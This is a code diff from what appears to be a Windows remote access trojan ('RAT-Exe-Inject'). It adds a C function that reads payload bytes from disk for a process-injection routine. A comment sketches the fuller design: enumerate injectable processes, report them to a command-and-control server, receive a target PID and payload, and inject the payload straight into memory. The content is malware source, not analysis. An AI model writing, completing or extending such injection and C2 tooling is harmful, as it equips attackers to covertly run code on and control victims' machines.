@@ -70,3 +70,67 @@ INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
 cleanup:
 	return status;
 }
+
+
+// read in the bytes for our payload 
+	// would be a bit different in implementation as we:
+		// scan for processes we can inject into 
+		// send them to C2
+		// get back the PID it wants to inject into; followed by payload
+		// open that process and inject bytes directly; dont need to read from disk
+INT readPayload(__in char* filePath, __inout UINT64* payloadSize, __inout char** payloadBytes)
+{
+	INT status = ERROR_SUCCESS;
+	CHAR messageBuffer[MAX_BUFFER_SIZE], *fileContents = NULL;
+	DWORD dwBytesRead = 0;
+	HANDLE hFile;
+	LARGE_INTEGER fileSize;
+
+	hFile = CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE)
+	{
+		OutputDebugStringA("RAT-Exe-Inject::readPayload - Failed to obtain file handle!\n");
+		goto cleanup;
+	}
+
+	if (!GetFileSizeEx(hFile, &fileSize))
+	{
+		sprintf_s(messageBuffer, "RAT-Exe-Injection::readPayload - Failure from GetFileSizeEx %d\n", GetLastError());
+		OutputDebugStringA(messageBuffer);
+		status = GetLastError();
+		goto cleanup;
+	}
+
+	fileContents = (char*)malloc(fileSize.QuadPart * sizeof(char));
+	if (fileContents == NULL)
+	{
+		OutputDebugStringA("RAT-Exe-Injection::readPayload - Failure from malloc (NOT ENOUGH MEMORY)");
+		status = FAILURE;
+		goto cleanup;
+	}
+
+	*payloadSize = fileSize.QuadPart;
+
+	if (!ReadFile(hFile, fileContents, fileSize.QuadPart, &dwBytesRead, NULL))
+	{
+		sprintf_s(messageBuffer, "RAT-Exe-Injection::readPayload - Failure from ReadFile %d\n", GetLastError());
+		OutputDebugStringA(messageBuffer);
+		status = GetLastError();
+		goto cleanup;
+	}
+
+	*payloadBytes = fileContents;
+
+	if (!CloseHandle(hFile))
+	{
+		printf_s(messageBuffer, "RAT-Exe-Injection::readPayload - Failure from CloseHandle %d\n", GetLastError());
+		OutputDebugStringA(messageBuffer);
+		status = GetLastError();
+		goto cleanup;
+	}
+
+
+
+cleanup:
+	return status;
+}
